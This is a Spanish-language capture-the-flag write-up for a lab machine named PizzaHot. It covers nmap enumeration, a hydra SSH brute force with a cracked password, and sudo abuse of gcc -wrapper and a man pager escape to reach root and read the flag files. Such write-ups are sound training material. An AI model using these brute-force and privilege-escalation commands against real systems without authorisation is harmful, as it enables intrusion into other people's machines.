# 🏴‍☠️ PizzaHot — Root Compromise Writeup

Un análisis técnico detallado, paso a paso, para la explotación, movimiento lateral y escalada de privilegios en el host objetivo **PizzaHot**.

---

## 🛠️ Resumen Operativo
* **Vector de Entrada:** Credenciales débiles en el servicio SSH (Fuerza Bruta).
* **Movimiento Lateral:** Abuso de configuración en `sudoers` mediante `gcc -wrapper`.
* **Escalada de Privilegios:** Escape del paginador de manuales (`man`) ejecutado como `root`.

---

## 🔍 Fase 01: Reconocimiento y Enumeración

### 1. Escaneo de Puertos (Descubrimiento Rápido)
Ejecutamos un escaneo táctico inicial deshabilitando el descubrimiento de host (`-Pn`) para acelerar la identificación de puertos TCP abiertos en el objetivo.

```bash
sudo nmap -Pn 192.168.0.4
```

**Puertos detectados:**
* `22/tcp` (SSH)
* `80/tcp` (HTTP)

### 2. Identificación de Servicios y Versiones
Auditamos en profundidad las huellas digitales y versiones específicas de los servicios en ejecución.

```bash
nmap -p 22,80 -sCV 192.168.0.4
```

**Resultados del análisis:**
* **SSH:** `OpenSSH 9.2p1 Debian 2+deb12u2`
* **HTTP:** `Apache httpd 2.4.59 ((Debian))` -> Título del sitio: *Pizzahot*

---

## 🚀 Fase 02: Acceso Inicial (Fuerza Bruta)

El servidor web aloja una página estática que no presenta vulnerabilidades explotables directas. Dirigimos nuestro ataque al servicio SSH aplicando fuerza bruta sobre el usuario objetivo `pizzapiña` usando el diccionario `rockyou.txt`.

```bash
hydra -l pizzapiña -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.4
```

**Credenciales comprometidas:**
* **Usuario:** `pizzapiña`
* **Contraseña:** `steven`

Establecemos la sesión interactiva cifrada:
```bash
ssh pizzapiña@192.168.0.4
```

---

## 🔄 Fase 03: Movimiento Lateral (pizzapiña ➡️ pizzasinpiña)

Una vez dentro de la máquina, auditamos los privilegios asignados en el archivo `sudoers` para descubrir posibles vectores de suplantación o abusos de binarios.

```bash
sudo -l
```

**Directiva detectada:**
* El usuario `pizzapiña` puede ejecutar el binario `/usr/bin/gcc` bajo el contexto e identidad del usuario objetivo `pizzasinpiña`.

### Explotación de GCC (Abuso de Wrapper)
Abusamos de la funcionalidad nativa de `gcc` mediante el parámetro `-wrapper`. Esto fuerza al binario a invocar una shell interactiva (`/bin/sh`) en lugar de compilar un archivo.

```bash
sudo -u pizzasinpiña /usr/bin/gcc -wrapper /bin/sh,-s .
```

Verificamos la identidad actual en el sistema:
```bash
whoami
# Output: pizzasinpiña
```

---

## ⚡ Fase 04: Escalada de Privilegios (pizzasinpiña ➡️ root)

Desde nuestro nuevo contexto comprometido, listamos nuevamente los privilegios de ejecución elevados disponibles en el host actual.

```bash
sudo -l
```

**Reglas Sudoers detectadas:**
* El usuario `pizzasinpiña` puede ejecutar el paginador del sistema `/usr/bin/man` como el usuario administrador (`root`) sin necesidad de contraseña (`NOPASSWD`).

### Explotación del Paginador del Sistema (MAN Escape)
Invocamos el manual del sistema de forma interactiva con privilegios elevados utilizando `sudo`.

```bash
sudo /usr/bin/man man
!/bin/bash
```

Una vez que la interfaz interactiva de `man` se despliega en la terminal, procedemos a realizar un escape de ejecución de subprocesos ingresando la siguiente directiva de escape nativa de entornos Unix:

```text
!/bin/bash
```

Presionamos `ENTER` para forzar la invocación limpia de la consola con máximos privilegios.

---

## 🏁 Fase 05: Post-Explotación y Captura de Flags

Confirmamos el control absoluto sobre el sistema operativo.

```bash
whoami
# Output: root
```

### Extracción de Evidencias (Loot)

* **User Flag (`pizzasinpiña`):**
  ```bash
  cat /home/pizzasinpiña/user.txt
  ```

* **Root Flag (`root`):**
  ```bash
  cat /root/root.txt
  ```

¡Máquina PizzaHot comprometida exitosamente! 🚀
